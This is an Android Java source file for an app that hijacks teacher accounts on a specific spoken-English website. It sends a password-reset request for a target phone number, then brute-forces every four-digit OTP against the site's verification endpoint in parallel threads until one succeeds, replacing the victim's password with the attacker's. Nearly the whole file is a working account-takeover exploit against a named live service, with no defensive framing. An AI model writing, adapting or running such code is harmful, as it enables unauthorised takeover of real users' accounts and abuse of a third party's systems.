package com.mycompany.myapp;import android.app.Activity; import android.content.Intent; import android.os.AsyncTask; import android.text.TextUtils; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.TextView;import org.json.JSONObject;import java.io.BufferedReader; import java.io.InputStreamReader; import java.io.OutputStream; import java.net.HttpURLConnection; import java.net.URL;
import android.widget.*;public class MainActivity extends Activity
 {private EditText phoneNoEditText;
	private EditText newPassEditText;
	private EditText confirmPassEditText;
	private Button submitButton;
	private Button button1;
	private Button button2;
	
	private TextView resultTextView;
	private String newPass; // Variable to store new password
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		// Initialize UI components
		phoneNoEditText = findViewById(R.id.phoneno);
		newPassEditText = findViewById(R.id.newpass);
		confirmPassEditText = findViewById(R.id.confirmpass);
		resultTextView = findViewById(R.id.resultView);
		button2 = findViewById(R.id.button2);
		submitButton = findViewById(R.id.submitBtn);
		button1 = findViewById(R.id.button1);
        
		button2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				Intent intent = new Intent(MainActivity.this, FindUser.class);
				startActivity(intent);
			}
		});
		// Set click listener for button1
		button1.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View view) {
					// Start the LoginActivity when button1 is clicked
					Intent intent = new Intent(MainActivity.this, LoginActivity.class);
					startActivity(intent);
				}
			});

		// Set click listener for submitButton
		submitButton.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					submitForm();
				}
			});
	}
	
	

	private void submitForm() {
		String phoneNo = phoneNoEditText.getText().toString().trim();
		newPass = newPassEditText.getText().toString().trim(); // Get the new password
		String confirmPass = confirmPassEditText.getText().toString().trim();

		// Check if phone number is valid (10 digits)
		if (TextUtils.isEmpty(phoneNo) || phoneNo.length() != 10) {
			resultTextView.setText("Invalid phone number.");
			resultTextView.setVisibility(View.VISIBLE);
			return;
		}

		// Ensure password has at least 8 characters
		if (TextUtils.isEmpty(newPass) || newPass.length() < 8) {
			resultTextView.setText("Password must be at least 8 characters.");
			resultTextView.setVisibility(View.VISIBLE);
			return;
		}

		if (!newPass.equals(confirmPass)) {
			resultTextView.setText("Passwords do not match.");
			resultTextView.setVisibility(View.VISIBLE);
			return;
		}

		// Make network requests in a separate AsyncTask
		new NetworkTask().execute(phoneNo);
	}

	private class NetworkTask extends AsyncTask<String, String, String> {
		@Override
		protected String doInBackground(String... params) {
			String phoneNo = params[0];

			try {
				// First request to change password
				String changePasswordResponse = makeRequest(
                    "https://www.sebaspokenenglish.com/auth/v1/teacher/forgotpassword",
                    "{\"phone\":\"" + phoneNo + "\",\"password\":\"" + newPass + "\",\"confirm_password\":\"" + newPass + "\",\"forgotPass\":true}"
				);
                
				// Check if response contains "data": "success"
				if (changePasswordResponse.contains("\"data\":\"success\"")) {
					// Proceed to OTP brute force if password change is successful
					
					bruteForceOTP(phoneNo);
				} else {
					return " • Warning: Target number undefined. Reconfigure parameters.";
				}
			} catch (Exception e) {
				e.printStackTrace();
				return "Error occurred: " + e.getMessage();
			}
			return ": Password changed successfully.";
		}

		private String makeRequest(String urlString, String jsonInputString) throws Exception {
			URL url = new URL(urlString);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Accept", "application/json");
			conn.setRequestProperty("Content-Type", "application/json");
			conn.setDoOutput(true);

			// Send request
			try (OutputStream os = conn.getOutputStream()) {
				byte[] input = jsonInputString.getBytes("utf-8");
				os.write(input, 0, input.length);
			}

			// Read response
			BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"));
			StringBuilder response = new StringBuilder();
			String responseLine;
			while ((responseLine = br.readLine()) != null) {
				response.append(responseLine.trim());
			}
			return response.toString();
		}

		private void bruteForceOTP(final String phoneNo) {
			for (int otp = 1000; otp <= 9999; otp++) {
				final int currentOtp = otp;
				new Thread(new Runnable() {
						@Override
						public void run() {
							publishProgress(" •······Engaging OTP protocol with key: " + currentOtp + " ······•");

							try {
								String verifyResponse = makeRequest(
									"https://www.sebaspokenenglish.com/auth/v1/teacher/forgotpassword/verify",
									"{\"phone\":\"" + phoneNo + "\",\"password\":\"" + newPass + "\",\"confirm_password\":\"" + newPass + "\",\"forgotPass\":true,\"otp\":\"" + currentOtp + "\"}"
								);

								// Check if verify response contains "data": "success"
								if (verifyResponse.contains("\"data\":\"success\"")) {
									publishProgress("Password changed successfully with OTP: " + currentOtp);
									;
									resultTextView.setVisibility(View.VISIBLE);
									return; // Stop further requests if successful
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
					}).start();

				// Sleep to control request rate
				try {
					Thread.sleep(15); // Approximately 15 requests per second
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}

		@Override
		protected void onProgressUpdate(String... values) {
			super.onProgressUpdate(values);
			resultTextView.setText(values[0]); // Update the UI with current OTP trying status
			resultTextView.setVisibility(View.VISIBLE);
		}

		@Override
		protected void onPostExecute(String result) {
			super.onPostExecute(result);
			resultTextView.setText(result); // Final result message
			resultTextView.setVisibility(View.VISIBLE);
		}
	}}
